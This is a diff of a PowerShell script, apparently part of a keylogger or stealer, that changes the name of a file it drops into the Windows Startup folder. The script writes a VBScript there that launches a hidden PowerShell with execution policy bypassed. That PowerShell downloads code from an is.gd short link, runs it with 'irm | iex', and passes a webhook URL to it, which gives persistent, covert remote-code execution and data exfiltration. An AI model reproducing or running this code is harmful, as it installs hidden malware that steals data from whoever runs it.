@@ -2,7 +2,7 @@
 
 if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
 
-$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.txt"
+$pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
 $mkFile = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
 $mkFile | Out-File -FilePath $pth -Force
 $mkFile = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://is.gd/bw_kl_to_dc | iex`", 0, True"
